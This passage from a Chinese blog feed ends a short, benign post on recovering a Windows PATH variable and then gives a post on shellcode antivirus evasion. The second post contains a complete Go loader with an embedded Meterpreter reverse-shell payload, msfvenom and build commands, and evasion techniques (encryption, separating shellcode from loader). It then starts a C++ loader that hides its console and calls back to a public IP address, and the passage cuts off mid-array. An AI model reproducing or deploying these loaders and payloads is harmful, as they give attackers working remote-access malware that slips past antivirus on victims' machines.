PATH</span><br></pre></td></tr></table></figure><ul><li>查找系统变量中所有的变量:</li></ul><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">REG QUERY <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment&quot;</span> /v *</span><br></pre></td></tr></table></figure><ul><li>查询系统变量中的path变量:</li></ul><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">REG QUERY <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment&quot;</span> /v path</span><br></pre></td></tr></table></figure><h1 id="恢复误修改的PATH"><a href="#恢复误修改的PATH" class="headerlink" title="恢复误修改的PATH"></a>恢复误修改的PATH</h1><p>千万不要重启电脑！ </p><h2 id="未重启"><a href="#未重启" class="headerlink" title="未重启"></a>未重启</h2><h3 id="利用还未关闭的IDEA-x2F-PyCharm-x2F-Goland-x2F-cmd-x2F-终端恢复"><a href="#利用还未关闭的IDEA-x2F-PyCharm-x2F-Goland-x2F-cmd-x2F-终端恢复" class="headerlink" title="利用还未关闭的IDEA&#x2F;PyCharm&#x2F;Goland&#x2F;cmd&#x2F;终端恢复"></a>利用还未关闭的IDEA&#x2F;PyCharm&#x2F;Goland&#x2F;cmd&#x2F;终端恢复</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#被修改的系统Path只是同步到了注册表中，并未立即生效，所以可以使用cmd命令行重新得到系统Path。</span></span><br><span class="line"><span class="comment">#如果你在修改系统Path前打开了以上任意IDE，无论你怎么修改环境Path都不会生效，必须重启IDE才能生效。</span></span><br><span class="line"><span class="comment">#由此，我们可以利用未关闭的IDE得到修改之前的Path变量的值。</span></span><br><span class="line"><span class="comment">#在终端或者IDE的Terminal窗口输入以下命令：</span></span><br><span class="line"><span class="built_in">echo</span> %Path%</span><br></pre></td></tr></table></figure><h3 id="使用备份注册表恢复"><a href="#使用备份注册表恢复" class="headerlink" title="使用备份注册表恢复"></a>使用备份注册表恢复</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#无论使用图形界面还是cmd命令行修改系统Path，都是立即同步到注册表文件的，所以，没有备份注册表也不用看了。</span></span><br><span class="line"><span class="comment">#使用regedit打开注册表；</span></span><br><span class="line"><span class="comment">#找到系统Path：</span></span><br><span class="line"><span class="comment">#注册表路径：计算机\HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Session Manager\Environment</span></span><br><span class="line"><span class="comment">#复制Path变量。</span></span><br></pre></td></tr></table></figure><h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h3><p>该方法意外的好用，找回了遗失的环境变量~~</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#用Windows PowerShell运行以下命令获取路径环境变量</span></span><br><span class="line"><span class="built_in">Get-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;HKCU:\Environment&quot;</span></span><br></pre></td></tr></table></figure><h3 id="利用用户配置备份文件恢复"><a href="#利用用户配置备份文件恢复" class="headerlink" title="利用用户配置备份文件恢复"></a><strong>利用用户配置备份文件恢复</strong></h3><p>这个方法适用于有用户配置文件备份或系统备份的情况下，在位于Users文件夹下的用户名子文件夹中找到名为NTUSER.DAT的文件，然后用记事本打开这个文件，里面就包含了旧路径环境变量，通过查找PATH相关语句，就可以获取路径环境变量了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\86063\NTUSER.DAT</span><br></pre></td></tr></table></figure><h2 id="已重启"><a href="#已重启" class="headerlink" title="已重启"></a>已重启</h2><p>这种情况下，在注册表中搜索名为Environment的项，并检查结果中出现的相关选项下是否尚包含路径环境变量。如果注册表中的环境变量被清空，那么可以在相同版本的win10注册表中，查找并复制默认路径环境变量值，进行恢复。</p><h3 id="使用win10默认Path"><a href="#使用win10默认Path" class="headerlink" title="使用win10默认Path"></a>使用win10默认Path</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%SystemRoot%\system32;%SystemRoot%;%SystemRoot%\System32\Wbem;%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\</span><br></pre></td></tr></table></figure><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><ul><li><a href="https://blog.csdn.net/chengcheng95588/article/details/103057424?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase">win10误删环境变量Path的几种恢复方法</a></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
          <category> Windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shellcode免杀</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E5%85%8D%E6%9D%80/Shellcode%E5%85%8D%E6%9D%80.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E5%85%8D%E6%9D%80/Shellcode%E5%85%8D%E6%9D%80.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Shellcode免杀"><a href="#Shellcode免杀" class="headerlink" title="Shellcode免杀"></a>Shellcode免杀</h1><p>接下来先讲解如何写一个shellcode加载器</p><h2 id="shellcodeLoder-go-学完go再来看"><a href="#shellcodeLoder-go-学完go再来看" class="headerlink" title="shellcodeLoder-go(学完go再来看)"></a>shellcodeLoder-go(学完go再来看)</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="comment">//定义一个main包，才能进行main函数的编写</span></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;os&quot;</span></span><br><span class="line">    <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    <span class="string">&quot;unsafe&quot;</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">//os包中的 API 主要可以帮助我们使用操作系统中的文件系统、权限系统、环境变量、系统进程以及系统信号</span></span><br><span class="line"><span class="comment">//syscall包包含一个指向底层操作系统原语的接口</span></span><br><span class="line"><span class="comment">//unsafe 是类型安全的操作,如当使用系统调用和Go结构必须具有与C结构相同的内存布局时，只能使用unsafe，也就是指针操作</span></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">    MEM_COMMIT             = <span class="number">0x1000</span></span><br><span class="line">    MEM_RESERVE            = <span class="number">0x2000</span></span><br><span class="line">    PAGE_EXECUTE_READWRITE = <span class="number">0x40</span></span><br><span class="line">)</span><br><span class="line"><span class="comment">// 定义一个常量 并初始化变量的值，这几个变量和上一节c++的shellode加载器编写一样</span></span><br><span class="line"><span class="comment">// MEM_COMMIT: 为特定的页面区域分配内存中或磁盘的页面文件中的物理内</span></span><br><span class="line"><span class="comment">// MEM_RESERVE: 保存地址而不分配物理存储，也就是保留这一个地址随时可利用；</span></span><br><span class="line"><span class="comment">// PAGE_EXECUTE_READWRITE: 可读可写可执行模式，可以理解为申请权限；</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line"><span class="comment">// 定义变量 并分别赋值</span></span><br><span class="line"><span class="comment">// 1. 通过syscall.MustLoadDLL方法调用kernel32.dll和ntdll.dll</span></span><br><span class="line"><span class="comment">// 2. 使用kernel32.dll调用ViretualAlloc函数</span></span><br><span class="line"><span class="comment">// 3. 使用ntdll.dll调用RtCopyMemory函数 ntdll.dll是重要的Windows NT内核级文件。描述了windows本地NTAPI的接口。当Windows启动时，ntdll.dll就驻留在内存中特定的写保护区域，使别的程序无法占用这个内存区域</span></span><br><span class="line"><span class="comment">// 4. 初始化shellcode_buf数组, 同时是字节类型</span></span><br><span class="line">    kernel32      = syscall.MustLoadDLL(<span class="string">&quot;kernel32.dll&quot;</span>)   <span class="comment">//调用kernel32.dll</span></span><br><span class="line">    ntdll         = syscall.MustLoadDLL(<span class="string">&quot;ntdll.dll&quot;</span>)      <span class="comment">//调用ntdll.dll</span></span><br><span class="line">    VirtualAlloc  = kernel32.MustFindProc(<span class="string">&quot;VirtualAlloc&quot;</span>) <span class="comment">//使用kernel32.dll调用ViretualAlloc函数</span></span><br><span class="line">    RtlCopyMemory = ntdll.MustFindProc(<span class="string">&quot;RtlCopyMemory&quot;</span>)   <span class="comment">//使用ntdll调用RtCopyMemory函数</span></span><br><span class="line">    <span class="comment">// msfvenom生成的shellcode</span></span><br><span class="line">    <span class="comment">// msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.58.133 lport=6666 -f c</span></span><br><span class="line">    shellcode_buf = []<span class="type">byte</span>&#123;</span><br><span class="line">    <span class="number">0xfc</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xe4</span>, <span class="number">0xf0</span>, <span class="number">0xe8</span>, <span class="number">0xcc</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x51</span>, <span class="number">0x41</span>, <span class="number">0x50</span>, <span class="number">0x52</span>,    <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xd2</span>, <span class="number">0x65</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x60</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x18</span>, <span class="number">0x51</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>,      <span class="number">0x52</span>, <span class="number">0x20</span>, <span class="number">0x56</span>, <span class="number">0x4d</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x72</span>, <span class="number">0x50</span>, <span class="number">0x48</span>, <span class="number">0x0f</span>, <span class="number">0xb7</span>, <span class="number">0x4a</span>, <span class="number">0x4a</span>,        <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0xac</span>, <span class="number">0x3c</span>, <span class="number">0x61</span>, <span class="number">0x7c</span>, <span class="number">0x02</span>, <span class="number">0x2c</span>, <span class="number">0x20</span>, <span class="number">0x41</span>, <span class="number">0xc1</span>, <span class="number">0xc9</span>, <span class="number">0x0d</span>, <span class="number">0x41</span>,        <span class="number">0x01</span>, <span class="number">0xc1</span>, <span class="number">0xe2</span>, <span class="number">0xed</span>, <span class="number">0x52</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x52</span>, <span class="number">0x20</span>, <span class="number">0x41</span>, <span class="number">0x51</span>, <span class="number">0x8b</span>, <span class="number">0x42</span>, <span class="number">0x3c</span>, <span class="number">0x48</span>,        <span class="number">0x01</span>, <span class="number">0xd0</span>, <span class="number">0x66</span>, <span class="number">0x81</span>, <span class="number">0x78</span>, <span class="number">0x18</span>, <span class="number">0x0b</span>, <span class="number">0x02</span>, <span class="number">0x0f</span>, <span class="number">0x85</span>, <span class="number">0x72</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x8b</span>,        <span class="number">0x80</span>, <span class="number">0x88</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x74</span>, <span class="number">0x67</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xd0</span>, <span class="number">0x50</span>, <span class="number">0x44</span>,        <span class="number">0x8b</span>, <span class="number">0x40</span>, <span class="number">0x20</span>, <span class="number">0x49</span>, <span class="number">0x01</span>, <span class="number">0xd0</span>, <span class="number">0x8b</span>, <span class="number">0x48</span>, <span class="number">0x18</span>, <span class="number">0xe3</span>, <span class="number">0x56</span>, <span class="number">0x48</span>, <span class="number">0xff</span>, <span class="number">0xc9</span>, <span class="number">0x4d</span>,        <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x41</span>, <span class="number">0x8b</span>, <span class="number">0x34</span>, <span class="number">0x88</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xd6</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x41</span>, <span class="number">0xc1</span>, <span class="number">0xc9</span>,        <span class="number">0x0d</span>, <span class="number">0xac</span>, <span class="number">0x41</span>, <span class="number">0x01</span>, <span class="number">0xc1</span>, <span class="number">0x38</span>, <span class="number">0xe0</span>, <span class="number">0x75</span>, <span class="number">0xf1</span>, <span class="number">0x4c</span>, <span class="number">0x03</span>, <span class="number">0x4c</span>, <span class="number">0x24</span>, <span class="number">0x08</span>, <span class="number">0x45</span>,        <span class="number">0x39</span>, <span class="number">0xd1</span>, <span class="number">0x75</span>, <span class="number">0xd8</span>, <span class="number">0x58</span>, <span class="number">0x44</span>, <span class="number">0x8b</span>, <span class="number">0x40</span>, <span class="number">0x24</span>, <span class="number">0x49</span>, <span class="number">0x01</span>, <span class="number">0xd0</span>, <span class="number">0x66</span>, <span class="number">0x41</span>, <span class="number">0x8b</span>,        <span class="number">0x0c</span>, <span class="number">0x48</span>, <span class="number">0x44</span>, <span class="number">0x8b</span>, <span class="number">0x40</span>, <span class="number">0x1c</span>, <span class="number">0x49</span>, <span class="number">0x01</span>, <span class="number">0xd0</span>, <span class="number">0x41</span>, <span class="number">0x8b</span>, <span class="number">0x04</span>, <span class="number">0x88</span>, <span class="number">0x48</span>, <span class="number">0x01</span>,        <span class="number">0xd0</span>, <span class="number">0x41</span>, <span class="number">0x58</span>, <span class="number">0x41</span>, <span class="number">0x58</span>, <span class="number">0x5e</span>, <span class="number">0x59</span>, <span class="number">0x5a</span>, <span class="number">0x41</span>, <span class="number">0x58</span>, <span class="number">0x41</span>, <span class="number">0x59</span>, <span class="number">0x41</span>, <span class="number">0x5a</span>, <span class="number">0x48</span>,        <span class="number">0x83</span>, <span class="number">0xec</span>, <span class="number">0x20</span>, <span class="number">0x41</span>, <span class="number">0x52</span>, <span class="number">0xff</span>, <span class="number">0xe0</span>, <span class="number">0x58</span>, <span class="number">0x41</span>, <span class="number">0x59</span>, <span class="number">0x5a</span>, <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x12</span>, <span class="number">0xe9</span>,        <span class="number">0x4b</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x5d</span>, <span class="number">0x49</span>, <span class="number">0xbe</span>, <span class="number">0x77</span>, <span class="number">0x73</span>, <span class="number">0x32</span>, <span class="number">0x5f</span>, <span class="number">0x33</span>, <span class="number">0x32</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,        <span class="number">0x41</span>, <span class="number">0x56</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x48</span>, <span class="number">0x81</span>, <span class="number">0xec</span>, <span class="number">0xa0</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xe5</span>,        <span class="number">0x49</span>, <span class="number">0xbc</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x0d</span>, <span class="number">0x05</span>, <span class="number">0x01</span>, <span class="number">0x75</span>, <span class="number">0x2f</span>, <span class="number">0xe7</span>, <span class="number">0x41</span>, <span class="number">0x54</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xe4</span>,        <span class="number">0x4c</span>, <span class="number">0x89</span>, <span class="number">0xf1</span>, <span class="number">0x41</span>, <span class="number">0xba</span>, <span class="number">0x4c</span>, <span class="number">0x77</span>, <span class="number">0x26</span>, <span class="number">0x07</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x4c</span>, <span class="number">0x89</span>, <span class="number">0xea</span>, <span class="number">0x68</span>,        <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x59</span>, <span class="number">0x41</span>, <span class="number">0xba</span>, <span class="number">0x29</span>, <span class="number">0x80</span>, <span class="number">0x6b</span>, <span class="number">0x00</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x6a</span>, <span class="number">0x0a</span>,        <span class="number">0x41</span>, <span class="number">0x5e</span>, <span class="number">0x50</span>, <span class="number">0x50</span>, <span class="number">0x4d</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x4d</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="number">0x48</span>, <span class="number">0xff</span>, <span class="number">0xc0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>,        <span class="number">0xc2</span>, <span class="number">0x48</span>, <span class="number">0xff</span>, <span class="number">0xc0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xc1</span>, <span class="number">0x41</span>, <span class="number">0xba</span>, <span class="number">0xea</span>, <span class="number">0x0f</span>, <span class="number">0xdf</span>, <span class="number">0xe0</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>,        <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xc7</span>, <span class="number">0x6a</span>, <span class="number">0x10</span>, <span class="number">0x41</span>, <span class="number">0x58</span>, <span class="number">0x4c</span>, <span class="number">0x89</span>, <span class="number">0xe2</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xf9</span>, <span class="number">0x41</span>, <span class="number">0xba</span>,<span class="number">0x99</span>, <span class="number">0xa5</span>, <span class="number">0x74</span>, <span class="number">0x61</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x85</span>, <span class="number">0xc0</span>, <span class="number">0x74</span>, <span class="number">0x0a</span>, <span class="number">0x49</span>, <span class="number">0xff</span>, <span class="number">0xce</span>, <span class="number">0x75</span>, <span class="number">0xe5</span>, <span class="number">0xe8</span>, <span class="number">0x93</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xec</span>, <span class="number">0x10</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe2</span>, <span class="number">0x4d</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x6a</span>, <span class="number">0x04</span>, <span class="number">0x41</span>, <span class="number">0x58</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xf9</span>, <span class="number">0x41</span>, <span class="number">0xba</span>, <span class="number">0x02</span>, <span class="number">0xd9</span>, <span class="number">0xc8</span>, <span class="number">0x5f</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x83</span>, <span class="number">0xf8</span>, <span class="number">0x00</span>, <span class="number">0x7e</span>, <span class="number">0x55</span>, <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xc4</span>, <span class="number">0x20</span>, <span class="number">0x5e</span>, <span class="number">0x89</span>, <span class="number">0xf6</span>, <span class="number">0x6a</span>, <span class="number">0x40</span>, <span class="number">0x41</span>, <span class="number">0x59</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x58</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xf2</span>, <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x41</span>, <span class="number">0xba</span>, <span class="number">0x58</span>, <span class="number">0xa4</span>, <span class="number">0x53</span>, <span class="number">0xe5</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xc3</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xc7</span>, <span class="number">0x4d</span>, <span class="number">0x31</span>, <span class="number">0xc9</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, <span class="number">0xf0</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xda</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xf9</span>, <span class="number">0x41</span>, <span class="number">0xba</span>, <span class="number">0x02</span>, <span class="number">0xd9</span>, <span class="number">0xc8</span>, <span class="number">0x5f</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x83</span>, <span class="number">0xf8</span>, <span class="number">0x00</span>, <span class="number">0x7d</span>, <span class="number">0x28</span>, <span class="number">0x58</span>, <span class="number">0x41</span>, <span class="number">0x57</span>, <span class="number">0x59</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x58</span>, <span class="number">0x6a</span>, <span class="number">0x00</span>, <span class="number">0x5a</span>, <span class="number">0x41</span>, <span class="number">0xba</span>, <span class="number">0x0b</span>, <span class="number">0x2f</span>, <span class="number">0x0f</span>, <span class="number">0x30</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x57</span>, <span class="number">0x59</span>, <span class="number">0x41</span>, <span class="number">0xba</span>, <span class="number">0x75</span>, <span class="number">0x6e</span>, <span class="number">0x4d</span>, <span class="number">0x61</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>, <span class="number">0x49</span>, <span class="number">0xff</span>, <span class="number">0xce</span>, <span class="number">0xe9</span>, <span class="number">0x3c</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xc3</span>, <span class="number">0x48</span>, <span class="number">0x29</span>, <span class="number">0xc6</span>, <span class="number">0x48</span>, <span class="number">0x85</span>, <span class="number">0xf6</span>, <span class="number">0x75</span>, <span class="number">0xb4</span>, <span class="number">0x41</span>, <span class="number">0xff</span>, <span class="number">0xe7</span>, <span class="number">0x58</span>, <span class="number">0x6a</span>, <span class="number">0x00</span>, <span class="number">0x59</span>, <span class="number">0x49</span>, <span class="number">0xc7</span>, <span class="number">0xc2</span>, <span class="number">0xf0</span>, <span class="number">0xb5</span>, <span class="number">0xa2</span>, <span class="number">0x56</span>, <span class="number">0xff</span>, <span class="number">0xd5</span>,</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"><span class="comment">// 定义错误处理函数,必须要做</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">checkErr</span><span class="params">(err <span class="type">error</span>)</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123; <span class="comment">//如果内存调用出现错误，可以报出错误</span></span><br><span class="line">        <span class="keyword">if</span> err.Error() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123; <span class="comment">//如果调用dll系统发出警告，但是程序运行成功，则不进行警报</span></span><br><span class="line">            <span class="built_in">println</span>(err.Error()) <span class="comment">//报出具体错误</span></span><br><span class="line">            os.Exit(<span class="number">1</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123; <span class="comment">// 定义main函数,main中做的事情和之前c的那个一样</span></span><br><span class="line">    shellcode := shellcode_buf</span><br><span class="line">   <span class="comment">// 调用VirtualAlloc为shellcode申请一块内存，addr, _, err时表示有三个返回值，addr表示返回内存的地址，_下划线表示不对返回值做处理，err表示错误的返回值</span></span><br><span class="line">    addr, _, err := VirtualAlloc.Call(<span class="number">0</span>, <span class="type">uintptr</span>(<span class="built_in">len</span>(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)</span><br><span class="line">    <span class="comment">// 判断申请的内存空间为空，则调用checkErr函数，并打印错误</span></span><br><span class="line">    <span class="keyword">if</span> addr ≠ <span class="number">0</span> &#123;</span><br><span class="line">        checkErr(err)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 调用RtlCopyMemory来将shellcode加载进内存当中</span></span><br><span class="line">    _, _, err = RtlCopyMemory.Call(addr, (<span class="type">uintptr</span>)(unsafe.Pointer(&amp;shellcode[<span class="number">0</span>])), <span class="type">uintptr</span>(<span class="built_in">len</span>(shellcode)))</span><br><span class="line">    checkErr(err)</span><br><span class="line">    <span class="comment">// syscall来运行shellcode，跳转到shellcode首地址开始执行</span></span><br><span class="line">    syscall.Syscall(addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#使用</span></span><br><span class="line"><span class="comment">#生成payload</span></span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.58.133 lport=6666 -f c</span><br><span class="line"><span class="comment">#注意payload格式要改为代码中那样，可以使用文本编辑器采用正则语法批量的替换修改和删除</span></span><br><span class="line"><span class="comment">#直接执行</span></span><br><span class="line">go run 文件.go</span><br><span class="line"><span class="comment">#编译</span></span><br><span class="line">go build -ldflags=<span class="string">&quot;-s -w&quot;</span> -o shellcode-launch-attack.exe 文件.go</span><br></pre></td></tr></table></figure><h2 id="shellcodeLoder-nim"><a href="#shellcodeLoder-nim" class="headerlink" title="shellcodeLoder-nim"></a>shellcodeLoder-nim</h2><ul><li>nim优点：</li></ul><blockquote><ul><li>nim也是一种编程语言，在免杀方面具有优势（语言小众，查杀可能不完善），相对于纯c++的代码免杀效果确实好一点，但是如果需要做的事情够多还是一样会被检测出来</li><li>可以直接编译为C、C+、Objective-C和Javascript.</li><li>语法简单，不依赖运行时虚拟机。</li><li>具有极其成熟的外部接口API。</li><li>跨平台交叉编译。</li><li>可以将代码直接编译为Javascript,甚至初步支持WebAssembly</li></ul></blockquote><blockquote><p>nim作者提高的代码示例：<a href="https://github.com/byt3bl33d3r/offensiveNim">https://github.com/byt3bl33d3r/offensiveNim</a></p></blockquote><ul><li>Nim安装</li></ul><blockquote><p><a href="https://nim-lang.org/install.html">https://nim-lang.org/install.html</a></p></blockquote><p>下载压缩包解压后，放入安装目录后执行finish.exe 进行环境安装配置</p><ul><li>Nim图形化加载shellcode，快速生成免杀可执行文件</li></ul><blockquote><p><a href="https://github.com/aeverj/NimShellCodeLoader">https://github.com/aeverj/NimShellCodeLoader</a> </p></blockquote><p>编译：直接通过vs编译后放入项目首文件夹</p><h2 id="Shellcode混淆免杀"><a href="#Shellcode混淆免杀" class="headerlink" title="Shellcode混淆免杀"></a>Shellcode混淆免杀</h2><h3 id="shellcode混淆简介"><a href="#shellcode混淆简介" class="headerlink" title="shellcode混淆简介"></a>shellcode混淆简介</h3><p>我们被静态查杀，主要就是被检测到了shellcode特征码。为了将其特征码打乱不被检测到。就需要进行混淆</p><p>其实就是把我们的shellcode进行加密：如base64，xor，AES等等。加密后再通过代码将我们加密过的shellcode解密~~即可实现免杀</p><h3 id="具体实现过程"><a href="#具体实现过程" class="headerlink" title="具体实现过程"></a>具体实现过程</h3><ol><li>生成shellcode</li><li>把shellcode加密</li><li>构造shellcode加载器</li><li>shellcode加载器把我们加密过后的shellcode解密</li><li>执行程序，上线C2</li></ol><p>总的来说，和普通的shellcode加载器没区别，只是将shellcode做了一些编码，以及向对应查杀的函数做了一些处理，不同语言实现的功能和方法都不同</p><h2 id="Shellcode分离免杀"><a href="#Shellcode分离免杀" class="headerlink" title="Shellcode分离免杀"></a>Shellcode分离免杀</h2><p>分离免杀实际上就是将我们的shellcode和加载器分离，首先通过加载器读取文件中的shellcode，然后加载进内存执行，在这个过程中我们的shellcode并不在加载器中，而是一个静态文件(图片，二进制文件等),所以杀软并不会查杀这些静态文件，仅仅对加载器查杀，那么我们只需考虑对加载器进行免杀即可。</p><h1 id="C-加载shellcode"><a href="#C-加载shellcode" class="headerlink" title="C++加载shellcode"></a>C++加载shellcode</h1><h2 id="C-loader-1"><a href="#C-loader-1" class="headerlink" title="C++loader-1"></a>C++loader-1</h2><h3 id="VirtualAlloc（上节讲过的代码-常见）"><a href="#VirtualAlloc（上节讲过的代码-常见）" class="headerlink" title="VirtualAlloc（上节讲过的代码,常见）"></a>VirtualAlloc（上节讲过的代码,常见）</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)  <span class="comment">//去除黑色框框（一）</span></span></span><br><span class="line"><span class="comment">// msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=124.223.217.243 lport=4321 -f c</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] =</span><br><span class="line"><span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x20\x48\x8b\x72\x50\x4d\x31\xc9\x48\x0f\xb7\x4a\x4a&quot;</span></span><br><span class="line"><span 